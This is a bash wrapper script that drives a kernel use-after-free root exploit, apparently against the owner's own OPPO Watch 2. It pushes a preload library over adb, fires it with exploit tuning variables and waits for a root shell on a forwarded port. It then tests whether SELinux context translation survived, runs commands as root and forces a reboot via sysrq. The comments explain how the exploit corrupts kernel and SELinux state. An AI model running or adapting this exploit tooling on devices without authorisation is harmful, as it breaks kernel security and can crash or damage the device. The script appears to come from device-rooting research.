#!/usr/bin/env bash
# One-shot rooted command batch for the OWW212, then an automatic reboot.
#
# Why the reboot is part of the tool: the exploit leaves a `rt_mutex_waiter`
# ghost linked into one of its own task's pi_waiters (that IS the UAF). pstore
# shows what happens when anything walks it later:
#     sys_sched_setattr -> rt_mutex_adjust_prio_chain+0x120
#                      -> _raw_spin_trylock  -> NULL deref at 0x4 -> panic
# The walker can be our next punch or an innocent app that gets the recycled
# stack page, so the only real mitigation is to keep the armed window short:
# fire, do the work, reboot. Nothing is written to the watch by this tool beyond
# files under /data/local/tmp.
#
#   bash rootrun.sh "id" "getenforce" "ls -l /data/system"      # fire, run, reboot
#   bash rootrun.sh --keep "id"                                 # skip the reboot
export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL='*'
ADB=/c/platform-tools/adb.exe
ROOT=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212
# Windows form: MSYS_NO_PATHCONV is on, so adb (a Windows exe) must be handed a
# Windows path for the LOCAL file. The msys form in $ROOT is only for cd/cat.
SO='C:\Users\RLG\Documents\oppowatch2-root\GhostLock-OWW212\exploit\preload.so'
DT=/data/local/tmp
KEEP=0
if [ "$1" = "--keep" ]; then KEEP=1; shift; fi
[ $# -ge 1 ] || { echo "usage: bash rootrun.sh [--keep] \"cmd\" [\"cmd\" ...]"; exit 1; }

# a fresh .so name every run: a panic corrupts the dentry of the name in use
N=$(cat "$ROOT/.sonum" 2>/dev/null || echo 1)
GS="rr$N.so"
echo $((N + 1)) > "$ROOT/.sonum"

if ! $ADB push "$SO" "$DT/$GS" 2>&1 | tail -1 | grep -q pushed; then
  echo "[rootrun] push of $GS failed (poisoned name?) - retry: bash rootrun.sh ..."
  exit 1
fi
$ADB shell "printf '#!/system/bin/sh\nexport LD_PRELOAD=\$GFSO\nexec /system/bin/toybox true\n' > $DT/rr.sh; chmod 755 $DT/rr.sh; rm -f $DT/log_*.txt" 2>/dev/null

echo "[rootrun] firing ($GS) ..."
( nohup $ADB shell "GFSO=$DT/$GS GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh $DT/rr.sh" >/dev/null 2>&1 & )

root=0
unsafe=0
for i in $(seq 1 20); do
  sleep 5
  # Newest log file ONLY: a panic can poison a log's dentry so `rm -f` cannot
  # delete it, and a stale "SKIP single-flight" line in it then makes a later run
  # misread a perfectly healthy fire as blocked (root.bat attempt 1, 17:14).
  if $ADB shell "cat \$(ls -t $DT/log_*.txt 2>/dev/null | head -1) 2>/dev/null" 2>/dev/null | tr -d '\r' | grep -q 'UW-SHELL listening'; then
    root=1; echo "[rootrun] ROOT after $((i * 5))s"
    # Is this a root the watch will SURVIVE using? If the permissive punch had to
    # write 0 (our recycled page was not 64KB aligned) it also cleared
    # selinux_state.initialized, SID->context dies, and real UI use ends in a
    # panic. `id -Z` is the direct functional test: resolving a context calls
    # security_sid_to_context(), so a broken one prints `?` instead of `u:r:...`
    # -- the same damage that has been showing up as `context=?` in every id
    # output so far. (A setprop probe is useless: an undefined property name is
    # rejected by init no matter how healthy SELinux is.) A session that fails is
    # rebooted through sysrq, because `adb reboot` is itself a property set.
    $ADB forward tcp:25555 tcp:25555 >/dev/null 2>&1
    if ! (cd "$ROOT" && python rootcmd.py 25 "echo CTX=[\$(id -Z)]" 2>/dev/null | tr -d '\r' | grep -q 'CTX=\[u:r:'); then
      unsafe=1
      echo "[rootrun] UNSAFE root: SID->context is dead (id -Z shows ?), so touching"
      echo "          the screen will go laggy and then panic. Rebooting for another try"
      echo "          (a safe fire needs our recycled page to land 64KB aligned)."
      (cd "$ROOT" && python rootcmd.py 25 "sync; sync; echo b > /proc/sysrq-trigger" >/dev/null 2>&1)
      root=0
      break
    fi
    echo "[rootrun] SAFE root: id -Z resolves a real context, UI use should hold"
    break
  fi
done

OUT=$ROOT/captures/rootrun-$(date +%m%d-%H%M%S).txt
if [ "$root" = "1" ]; then
  cd "$ROOT" && $ADB forward tcp:25555 tcp:25555 >/dev/null 2>&1
  python rootsh.py "$@" 2>&1 | tr -d '\r' > "$OUT"
  echo "----- output -----"
  cat "$OUT"
  echo "--------------------"
  echo "[rootrun] saved: $OUT"
else
  echo "[rootrun] no root this boot (log left in $DT/log_*.txt)"
fi

if [ "$KEEP" = "0" ]; then
  echo "[rootrun] rebooting the watch to disarm the leftover PI state ..."
  # `adb reboot` does nothing on this production build (adbd may not run the
  # reboot service), and the rooted cred DOES hold CAP_SYS_BOOT (bit 22 of the
  # value we stamp), so reboot through the root daemon instead.
  # Neither `adb reboot` (production adbd refuses the reboot service) nor
  # `setprop sys.powerctl reboot` works here: zeroing selinux_state breaks
  # SID->context translation, so init answers
  #     "Unable to set property 'sys.powerctl': getpeercon() failed"
  # and drops the request. /proc/sysrq-trigger is --w--w---- root:system, we are
  # uid 0, and `sync` runs first, so the sysrq reboot is the reliable way out.
  python rootcmd.py 25 "sync; sync; echo b > /proc/sysrq-trigger" >/dev/null 2>&1
  sleep 3
  $ADB reboot >/dev/null 2>&1
  sleep 5
  echo "[rootrun] done - the watch is booting clean (Enforcing, uid 2000)."
else
  echo "[rootrun] --keep: root stays live, but remember the watch can panic on any"
  echo "          later futex-PI walk. Reboot when you are done: adb reboot"
fi
